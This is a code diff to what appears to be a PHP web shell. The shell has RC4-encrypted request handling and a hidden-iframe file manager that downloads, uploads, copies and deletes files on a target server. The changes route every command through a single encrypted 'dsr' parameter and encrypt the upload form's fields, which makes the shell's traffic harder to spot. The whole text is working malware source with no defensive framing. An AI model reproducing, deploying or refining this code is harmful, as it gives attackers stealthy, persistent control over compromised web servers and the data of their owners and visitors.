@@ -627,6 +627,7 @@ function filesize64($file){
 $sBuff = '';  	
 $p = getCrypt();
 
+
 # Sections
 if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	$i = 0;
@@ -747,7 +748,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	function getCrypt(d, t){
 		b = rc4Init(hash);
 		if (t === "e")
-			$r = "dsr=" + euc(btoa(rc4(d, b)));
+			$r = euc(btoa(rc4(d, b)));
 		else
 			$r = rc4(atob(d), b);
 		
@@ -774,7 +775,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			req.setRequestHeader("X-Requested-With", "XMLHttpRequest");
 			req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 			req.setRequestHeader("Connection", "close");
-			req.send(getCrypt(p, "e"));
+			req.send("dsr=" + getCrypt(p, "e"));
 		}
 		return ao;
 	}
@@ -950,7 +951,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	function processUI(a, o, n){
 		if (a === "comp"){
 			hide_box();
-			append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?" + getCrypt("me=file&md=tools&ac=comp&" + o , "e") + "\'></iframe>");
+			append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?dsr=" + getCrypt("me=file&md=tools&ac=comp&" + o , "e") + "\'></iframe>");
 		} else {
 			if (a !== "rdel" && n === "") return;
 			if (a !== "copy" && a !== "rdel") o = euc(o);
@@ -966,11 +967,11 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	
 	function dl(o){
 		remove("dlf");
-		append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?" + getCrypt("me=file&md=tools&ac=dl&fl=" + euc(dpath(o, true)), "e") + "\'></iframe>");
+		append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?dsr=" + getCrypt("me=file&md=tools&ac=dl&fl=" + euc(dpath(o, true)), "e") + "\'></iframe>");
 	}
 	
 	function up(){
-		ct = "<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\'' . getSelf() . '\'><input type=\'hidden\' value=\'file\' name=\'me\'><input type=\'hidden\' value=\'up\' name=\'ac\'><input type=\'hidden\' value=\'" + d.getElementById("base").value + "\' name=\'dir\'><table class=\'boxtbl\'><tr><td class=\'colFit\'>' . tText('file', 'File') . '</td><td><input name=\'upf\' value=\'\' type=\'file\' /></td></tr><tr><td colspan=\'2\'><span class=\'button\' onclick=\'document.up.submit()\'>' . tText('go', 'Go!') . '</span></td></tr></table></form>";
+		ct = "<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\'' . getSelf() . '\'><input type=\'hidden\' value=\'" + decodeURIComponent(getCrypt("me=file&ac=up&dir=" + euc(d.getElementById("base").value), "e")) + "\' name=\'dsr\'><table class=\'boxtbl\'><tr><td class=\'colFit\'>' . tText('file', 'File') . '</td><td><input name=\'upf\' value=\'\' type=\'file\' /></td></tr><tr><td colspan=\'2\'><span class=\'button\' onclick=\'document.up.submit()\'>' . tText('go', 'Go!') . '</span></td></tr></table></form>";
 		show_box("' . tText('upload', 'Upload') . '", ct);
 	}
 	
